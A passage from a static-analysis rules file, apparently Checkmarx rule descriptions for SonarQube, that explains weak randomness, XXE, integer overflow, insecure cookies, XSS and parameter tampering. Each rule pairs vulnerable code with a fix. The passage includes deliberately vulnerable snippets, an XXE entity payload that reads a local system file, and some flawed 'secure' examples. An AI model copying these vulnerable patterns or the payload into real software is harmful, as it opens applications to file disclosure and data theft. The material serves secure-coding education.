&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses a weak method of generating pseudo-random values, such that other numbers could be determined from a relatively small sample size. Since the pseudo-random number generator used is designed for statistically uniform distribution of values, it is approximately deterministic. Thus, after collecting a few generated values (e.g. by creating a few individual sessions, and collecting the sessionids), it would be possible for an attacker to calculate another sessionid.&amp;#160;&lt;br /&gt;Specifically, if this&amp;#160;pseudo-random value is used in any security context, such as passwords, keys, or secret identifiers, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Whenever unpredicatable numbers are required in a security context, use a cryptographically strong random number generator, instead of a statistical pseudo-random generator.&amp;#160;&lt;/li&gt;
&lt;li&gt;Use the cryptorandom generator that is built-in to your language or platform, and ensure it is securely seeded. Do not seed the generator with a weak, non-random seed. (In most cases, the default is securely random).&amp;#160;&lt;/li&gt;
&lt;li&gt;Ensure you use a long enough random value, to make brute-force attacks unfeasible.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not use the statistical pseudo-random number generator, use the cryptorandom generator instead. In Java, this is the SecureRandom class.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Objc&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;long sessNum = rand();
NSString* sessionId = [NSString stringWithFormat:@"%ld", sessNum];&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;UInt32 sessBytes;
SecRandomCopyBytes(kSecRandomDefault, sizeof(sessBytes), (uint8_t*)&amp;sessBytes);
    
NSString* sessionId = [NSString stringWithFormat:@"%llu", sessBytes];&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;
Random random = new Random();

long sessNum = random.nextLong();

String sessionId = sessNum.toString();
&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;
SecureRandom random = new SecureRandom();

byte sessBytes[] = new byte[32];

random.nextBytes(sessBytes);

String sessionId = new String(sessBytes);
&lt;/pre&gt;&lt;h3&gt;Swift&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;let sessNum = rand();
let sessionId = String(format:"%ld", sessNum)&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;var sessBytes: UInt32 = 0
withUnsafeMutablePointer(&amp;sessBytes, { (sessBytesPointer) -&gt; Void in
    let castedPointer = unsafeBitCast(sessBytesPointer, UnsafeMutablePointer&lt;UInt8&gt;.self)
    SecRandomCopyBytes(kSecRandomDefault, sizeof(UInt32), castedPointer)
})
    
let sessionId = String(format:"%llu", sessBytes)&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_3584</key><name>Potential_XXE_Injection</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An&amp;#160;application that will parse and replace DTD entity references, in an XML document that the user controls, can allow an attacker to craft an XML document to read arbitrary server files. This XML document could contain an XML entity reference, which refers to an embedded DTD entity definition that points to any local file. This would enable the attacker to retrieve any arbitrary system file on the server.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;An attacker could upload an XML document that contains a DTD declaration, in particular an entity defintion that refers to a local file on the server's disk, e.g. &lt;code&gt;&amp;lt;!ENTITY xxe SYSTEM "file:///c:/boot.ini"&amp;gt;&lt;/code&gt;. The attacker would then include an XML entity reference that refers back to that entity definition, e.g. &lt;code&gt;&amp;lt;div&amp;gt;&amp;amp;xxe;&amp;lt;/div&amp;gt;&lt;/code&gt; . If the parsed XML document is then returned to the user, the result will include the contents of the sensitive system file.&amp;#160;&lt;/div&gt;
&lt;div&gt;This is caused by the XML parser, which is configured to automatically parse DTD declarations and resolve entity references, instead of disabling both DTD and external references altogether.&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Avoid processing user input directly, where possible.&amp;#160;&lt;/li&gt;
&lt;li&gt;If necessary to receive XML from the user, ensure the XML parser is restricted and constrained.&amp;#160;&lt;/li&gt;
&lt;li&gt;In particular, disable DTD parsing and resolving of entities. Apply a strict XML schema on the server, and validate the input XML accordingly.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Use safe XML parsers, and disable DTD parsing and entity resolving.&amp;#160;&lt;/li&gt;
&lt;li&gt;Do not enable DTD parsing or entity resolving.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Vulnerable XML Parsing with XMLStreamReader&lt;/h4&gt;&lt;pre&gt;String parseXML(InputStream input) {
    StringBuilder content = new StringBuilder();
    
    XMLInputFactory factory = XMLInputFactory.newFactory(); 
    factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, true);
    factory.setProperty(XMLInputFactory.SUPPORT_DTD, true); 
    
    XMLStreamReader reader = factory.createXMLStreamReader(input);
    
    while(reader.hasNext())
    {
        if(reader.hasText()
        {
            content.append(reader.getText());
        }
        reader.next();
    }
    
    return content.toString();
}
&lt;/pre&gt;&lt;h4&gt;Disabling DTD Entities with XMLStreamReader&lt;/h4&gt;&lt;pre&gt;String parseXML(InputStream input) {
    StringBuilder content = new StringBuilder();
    
    XMLInputFactory factory = XMLInputFactory.newFactory(); 
    factory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
    factory.setProperty(XMLInputFactory.SUPPORT_DTD, false); 
    
    XMLStreamReader reader = factory.createXMLStreamReader(input);
    
    while(reader.hasNext())
    {
        if(reader.hasText()
        {
            content.append(reader.getText());
        }
        reader.next();
    }
    
    return content.toString();
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1649</key><name>Integer_Overflow</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Assigning large data types into smaller data types, without proper checks and explicit casting, will&amp;#160;lead to undefined behavior and unintentional effects, such as data corruption (e.g. value wraparound, wherein maximum values become minimum values); system crashes; infinite loops; logic errors, such as bypassing of security mechanisms; or even buffer overflows leading to arbitrary code execution.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;This flaw can occur when&amp;#160;implicitly casting numerical data types of a larger size, into a variable with a data type of a smaller size. This forces the program to discard some bits of information from the number.&lt;/div&gt;
&lt;div&gt;Depending on how the numerical data types are stored in memory, this is often the bits with the highest value, causing substantial corruption of the stored number. Alternatively,&amp;#160;the sign bit of a signed integer could be lost, completely reversing the intention of the number.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Avoid casting larger data types to smaller types.&amp;#160;&lt;/li&gt;
&lt;li&gt;Prefer promoting the target variable to a large enough data type.&amp;#160;&lt;/li&gt;
&lt;li&gt;If downcasting is necessary, always check that values are valid and in range of the target type, before casting&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;CPP&lt;/h3&gt;&lt;h4&gt;Unsafe Downsize Casting&lt;/h4&gt;&lt;pre&gt;int unsafe_addition(short op1, int op2) { 

    // op2 gets forced from int into a short
    short total = op1 + op2; 
    
    return total;
}
&lt;/pre&gt;&lt;h4&gt;Safer Use of Proper Data Types&lt;/h4&gt;&lt;pre&gt;int safe_addition(short op1, int op2) { 

    // total variable is of type int, the largest type that is needed
    int total = 0; 

    // check if total will overflow available integer size 
    if (INT_MAX - abs(op2) &gt; op1) 
    {
        total = op1 + op2; 
    }
    else
    {
        // instead of overflow, saturate (but this is not always a good thing)
        total = INT_MAX
    }
    
    return total;
}
&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_1681</key><name>Use_of_Insufficiently_Random_Values</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Random values are often used as a mechanism to prevent malicious users from guessing a value, such as a password, encryption key, or session identifier. Depending on what&amp;#160;this random value is used for, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values. This could enable the attacker to hijack another user's session, impersonate another user, or crack an encryption key (depending on what&amp;#160;the pseudo-random value was used for).&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The application uses a weak method of generating pseudo-random values, such that other numbers could be determined from a relatively small sample size. Since the pseudo-random number generator used is designed for statistically uniform distribution of values, it is approximately deterministic. Thus, after collecting a few generated values (e.g. by creating a few individual sessions, and collecting the sessionids), it would be possible for an attacker to calculate another sessionid.&amp;#160;&lt;br /&gt;Specifically, if this&amp;#160;pseudo-random value is used in any security context, such as passwords, keys, or secret identifiers, an attacker would be able to predict&amp;#160;the next numbers generated, or previously generated values.&amp;#160;&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;Generic Guidance:&lt;/div&gt;
&lt;/div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Whenever unpredicatable numbers are required in a security context, use a cryptographically strong random number generator, instead of a statistical pseudo-random generator.&amp;#160;&lt;/li&gt;
&lt;li&gt;Use the cryptorandom generator that is built-in to your language or platform, and ensure it is securely seeded. Do not seed the generator with a weak, non-random seed. (In most cases, the default is securely random).&amp;#160;&lt;/li&gt;
&lt;li&gt;Ensure you use a long enough random value, to make brute-force attacks unfeasible.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;div&gt;
&lt;div&gt;&amp;#160;&lt;/div&gt;
&lt;div&gt;Specific Recommendations:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;ul&gt;
&lt;li&gt;Do not use the statistical pseudo-random number generator, use the cryptorandom generator instead. In Java, this is the SecureRandom class.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Objc&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;long sessNum = rand();
NSString* sessionId = [NSString stringWithFormat:@"%ld", sessNum];&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;UInt32 sessBytes;
SecRandomCopyBytes(kSecRandomDefault, sizeof(sessBytes), (uint8_t*)&amp;sessBytes);
    
NSString* sessionId = [NSString stringWithFormat:@"%llu", sessBytes];&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;
Random random = new Random();

long sessNum = random.nextLong();

String sessionId = sessNum.toString();
&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;
SecureRandom random = new SecureRandom();

byte sessBytes[] = new byte[32];

random.nextBytes(sessBytes);

String sessionId = new String(sessBytes);
&lt;/pre&gt;&lt;h3&gt;Swift&lt;/h3&gt;&lt;h4&gt;Use of a weak pseudo-random number generator&lt;/h4&gt;&lt;pre&gt;let sessNum = rand();
let sessionId = String(format:"%ld", sessNum)&lt;/pre&gt;&lt;h4&gt;Cryptographically secure random number generator&lt;/h4&gt;&lt;pre&gt;var sessBytes: UInt32 = 0
withUnsafeMutablePointer(&amp;sessBytes, { (sessBytesPointer) -&gt; Void in
    let castedPointer = unsafeBitCast(sessBytesPointer, UnsafeMutablePointer&lt;UInt8&gt;.self)
    SecRandomCopyBytes(kSecRandomDefault, sizeof(UInt32), castedPointer)
})
    
let sessionId = String(format:"%llu", sessBytes)&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MAJOR</severity><tag>checkmarx-medium</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_599</key><name>Sensitive_Cookie_in_HTTPS_Session_Without_Secure_Attribute</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;p&gt;&lt;span id="docs-internal-guid-c71b5d0e-c0ef-f4ee-b44c-6e4a7fd4b4cc"&gt;&lt;span style="font-family: Arial; vertical-align: baseline; white-space: pre-wrap;"&gt;Cookies that contain the user's session identifier, and other sensitive application cookies, should be sent to the server over a secure network communication (HTTPS) in order to prevent attackers from sniffing the traffic and stealing those cookies. Unless the web application explicitly prevents this by using the "secure" cookie flag, these cookies will also be sent over insecure traffic, which can lead to session hijacking and impersonation.&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;The web application framework by default does not set the "secure" flag for the application's sessionID cookie, and other sensitive application cookies. Likewise, the application does not explicitly use the "secure" cookie flag, allowing them to be sent in plaintext over an insecure session.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;ul&gt;
&lt;li&gt;Always set the "secure" flag for any sensitive server-side cookies.&lt;/li&gt;
&lt;li&gt;If the application explicitly handles cookies directly in application code, set the "secure" flag for sensitive cookies set by the application.&lt;/li&gt;
&lt;/ul&gt;
&lt;div&gt;&lt;strong&gt;Secure-Code Approach&lt;/strong&gt;&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;&lt;span style="text-indent: -0.25in;"&gt;Configure the application to always use "secure" cookies, in the site-wide configuration file.&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span style="text-indent: -0.25in;"&gt;Enable the Secure flag or use the relevant Set-Secure API in the code.&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;ASP&lt;/h3&gt;&lt;h4&gt;Web.config Configuration File with Secure Cookies:&lt;/h4&gt;&lt;pre&gt;&lt;system.web&gt;
 &lt;httpCookies requireSSL="true" &gt;&lt;/httpCookies&gt;
&lt;/system.web&gt;&lt;/pre&gt;&lt;h3&gt;CSharp&lt;/h3&gt;&lt;h4&gt;Explicit Cookie Handling in Code:&lt;/h4&gt;&lt;pre&gt;HttpCookie cookie = new HttpCookie('sessionid');
cookie.Secure = True;
cookie.Value = GetNewSessionToken();
&lt;/pre&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Web.xml Configuration File with Secure Cookies:&lt;/h4&gt;&lt;pre&gt;&lt;session-config&gt;
 &lt;cookie-config&gt;
  &lt;secure&gt;true&lt;/secure&gt;
 &lt;/cookie-config&gt;
&lt;/session-config&gt;&lt;/pre&gt;&lt;h4&gt;Explicit Cookie Handling in Code:&lt;/h4&gt;&lt;pre&gt;Cookie newCookie = new Cookie("name","value");
newCookie.setSecure(true);&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_4034</key><name>Suspected_XSS</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;An attacker could bypass the regular channels&amp;#160;made by the system to avoid Cross-Site Scripting (XSS) attacks in order to inject JavaScript or HTML code. By using social engineering to cause a user to access the website with injection inputs, such as a URL with engineered session attributes, causing the browser to rewrite web pages.&amp;#160;The attacker can then pretend to be the original website, which would enable the attacker to steal the user's session, request the user&amp;#8217;s credentials, provide false information, or run malware. From the victim&amp;#8217;s point of view, this is the original website's action.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;The application web page includes data from a client-side controlled data&amp;#160;(including the page session). The user input is embedded in the page, causing the browser to display it as part of the web page. If the input includes HTML fragments or JavaScript, these are displayed too, and the user cannot tell that this is not the intended page. The vulnerability is the result of embedding arbitrary client-side controlled input without first encoding it in a format that would prevent the browser from treating it like HTML instead of plain text.&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Validate all input, regardless of source. Validation should be based on a whitelist: accept only data fitting a specified structure, rather than reject bad patterns. Check for:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Data type&lt;/li&gt;
&lt;li&gt;Size&lt;/li&gt;
&lt;li&gt;Range&lt;/li&gt;
&lt;li&gt;Format&lt;/li&gt;
&lt;li&gt;Expected values&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;&lt;strong&gt;Secure-Coding Approach&lt;/strong&gt;&lt;/div&gt;
&lt;div&gt;Fully encode all dynamic data before embedding it in the webpage. Encoding should be context-sensitive. For example:&lt;br /&gt;
&lt;ol&gt;
&lt;ul&gt;
&lt;li&gt;HTML encoding for HTML content.&lt;/li&gt;
&lt;li&gt;HTML Attribute encoding for data output to attribute values.&lt;/li&gt;
&lt;li&gt;JavaScript encoding for JavaScript.&lt;/li&gt;
&lt;/ul&gt;
&lt;/ol&gt;
It is recommended to use the known libraries for encoding output, such as ESAPI.&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;JavaScript&lt;/h3&gt;&lt;h4&gt;Dynamically calling a function without sanitizing the input:&lt;/h4&gt;&lt;pre&gt;var input = document.getElementById("id").value;
window.setInterval( myFunc(input), 1000);&lt;/pre&gt;&lt;h4&gt;Sanitizing input before using it in a function:&lt;/h4&gt;&lt;pre&gt;var input = document.getElementById("id").value;
var trusted = escape(input);
window.setInterval( myFunc(trusted), 1000);&lt;/pre&gt;&lt;h4&gt;For dynamically updating HTML in the DOM, use the OWASP ESAPI4JS library:&lt;/h4&gt;&lt;pre&gt;document.write("&lt;%=Encoder.encodeForJS(Encoder.encodeForHTML(untrustedData))%&gt;");&lt;/pre&gt;&lt;h4&gt;If you must set code to be called dynamically, only call predefined methods or hard-coded Javascript. Never call “eval()” or dynamically create code:&lt;/h4&gt;&lt;pre&gt;window.setInterval( "timedFunction();", 1000);&lt;/pre&gt;&lt;h4&gt;If you must set code to be called dynamically, only call predefined methods or hard-coded Javascript. Never call “eval()” or dynamically create code:&lt;/h4&gt;&lt;pre&gt;window.setInterval( "timedFunction();", 1000);&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_583</key><name>Heuristic_Parameter_Tampering</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;A malicious user could access other users&amp;#8217; information. By requesting information directly, such as by an account number, authorization may be bypassed and the attacker could steal confidential or restricted information (for example, a bank account balance), using a direct object reference.&amp;#160;&lt;/div&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;The application provides user information without filtering by user ID. For example, it may provide information solely by a submitted account ID. The application concatenates the user input directly into the SQL query string, without any additional filtering. The application also does not perform any validation on the input, nor constrain it to a pre-computed list of acceptable values.&amp;#160;&lt;/div&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&amp;#160;&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Enforce authorization checks before providing any access to sensitive data, including the specific object reference.&amp;#160;&lt;/li&gt;
&lt;li&gt;Explicitly block access to any unauthorized data, especially to other users&amp;#8217; data.&lt;/li&gt;
&lt;li&gt;If possible, avoid allowing the user to request arbitrary data by simply sending a record ID. For example, instead of having the user send an account ID, the application should look up the account ID for the current authenticated user session.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Mitigation:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Do not concatenate user input directly into SQL queries.&amp;#160;&lt;/li&gt;
&lt;li&gt;Include a user-specific identifier as a filter in the WHERE clause of the SQL query.&amp;#160;&lt;/li&gt;
&lt;li&gt;Map the user input to an indirect reference, e.g. via a prepared list of allowable values.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unfiltered Direct Object Reference&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req)  {
    int accountId = Integer.parseInt(req.getParameter("accountId"));
    
    string sql = "select * from [Accounts] where [AccountId] = " 
                        + accountId.toString();
                        
    Statement stmt = conn.createStatement();
    ResultSet accountRS = stmt.executeQuery(sql); 
    
    return accountRS;
}&lt;/pre&gt;&lt;h4&gt;Record References are Now Filtered and Indirect&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req)  {
    int accountIndex = Integer.parseInt(req.getParameter("accountIndex"));
    int realAccountId = userAccountList.get(accountIndex);
    
    int userId = req.getSession().getAttribute("userId"); 
    
    string sql = "select * from [Accounts] where [AccountId] = " 
                        + realAccountId.toString() 
                        + " and [UserId] = " + userId.toString();
                        
    Statement stmt = conn.createStatement();
    ResultSet accountRS = stmt.executeQuery(sql); 
    
    return accountRS;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_582</key><name>Heuristic_DB_Parameter_Tampering</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;A malicious user could access other users&amp;#8217; personal information, by simply altering the reference parameter sent to the server. Thus, the malicious user could bypass access controls and access unauthorized records, such as other users accounts,&amp;#160;stealing confidential or restricted information.&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;The application accesses&amp;#160;user information without filtering by user ID. For example, it may provide information solely by a submitted account ID. The application uses the user input to filter specific records from database tables, which contain sensitive personal information (e.g. user accounts or payment details). Since the application does not filter the records according to any user identifier, nor&amp;#160;constrain it to a pre-computed list of acceptable values, a malicious user can easily modify the submitted reference identifier, and thus access unauthorized records.&amp;#160;&lt;/div&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;General Recommendations&lt;/h2&gt;&lt;h4&gt;How to avoid it&lt;/h4&gt;&lt;p&gt;&lt;div&gt;Generic Guidance:&amp;#160;&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Enforce authorization checks before providing any access to sensitive data, including the specific object reference.&amp;#160;&lt;/li&gt;
&lt;li&gt;Explicitly block access to any unauthorized data, especially to other users&amp;#8217; data.&lt;/li&gt;
&lt;li&gt;If possible, avoid allowing the user to request arbitrary data by simply sending a record ID. For example, instead of having the user send an account ID, the application should look up the account ID for the current authenticated user session.&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;div&gt;Specific Mitigation:&lt;/div&gt;
&lt;div&gt;
&lt;ul&gt;
&lt;li&gt;Filter the database query according to&amp;#160;a user-specific identifier, such as the customer number.&amp;#160;&lt;/li&gt;
&lt;li&gt;Map the user input to an indirect reference, e.g. via a prepared list of allowable values.&amp;#160;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;      
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Source Code Examples&lt;/h2&gt;&lt;h3&gt;Java&lt;/h3&gt;&lt;h4&gt;Unfiltered Direct Object Reference&lt;/h4&gt;&lt;pre&gt;public ResultSet getAccountInfo(request req){
    int accountId = Integer.parseInt(req.getParameter("accountId"));    
    PreparedStatement stmt = connection.PreparedStatement("SELECT * from Accounts where AccountId = ?");
    
    stmt.setInt(1, accountId);   
    ResultSet accountRS = stmt.executeQuery();                 
    
    return accountRS;
}&lt;/pre&gt;&lt;h4&gt;Record References are Now Filtered and Indirect&lt;/h4&gt;&lt;pre&gt;    public ResultSet getAccountInfo(request req){
    int accountIndex = Integer.parseInt(req.getParameter("accountId"));
    int realAccountId = userAccountList.get(accountIndex);
    int userId = req.getSession().getAttribute("userId"); 
    PreparedStatement stmt = connection.PreparedStatement("SELECT * from Accounts where AccountId = ? AND UserId = ?");
    
    stmt.setInt(1, realAccountId);   
    stmt.setInt(2, userId);
    ResultSet accountRS = stmt.executeQuery();                 
    
    return accountRS;
}&lt;/pre&gt;&lt;div style="display:none"&gt;]]&lt;/div&gt;</description><severity>MINOR</severity><tag>checkmarx-low</tag><type>VULNERABILITY</type></rule><rule><key>checkmarx_638</key><name>Parameter_Tampering</name><description>&lt;div style="display:none"&gt;![CDATA[&lt;/div&gt;&lt;h2&gt;Risk&lt;/h2&gt;&lt;h4&gt;What might happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;A malicious user could access other users&amp;#8217; information. By requesting information directly, such as by an account number, authorization may be bypassed and the attacker could steal confidential or restricted information (for example, a bank account balance), using a direct object reference.&amp;#160;&lt;/div&gt;
&lt;/div&gt;            
&lt;/p&gt;&lt;hr&gt;&lt;h2&gt;Cause&lt;/h2&gt;&lt;h4&gt;How does it happen&lt;/h4&gt;&lt;p&gt;&lt;div&gt;
&lt;div&gt;The application provides user information without filtering by user ID. For example, it may provide information solely by a submitted account ID. The application concatenates the user input directly into the SQL query string, without any additional filtering. The application also does not perform any validation on the input, nor constrain it to a pre-computed list of acceptable values.&amp;#160;&lt;/div&gt;
&lt;/div&gt;            
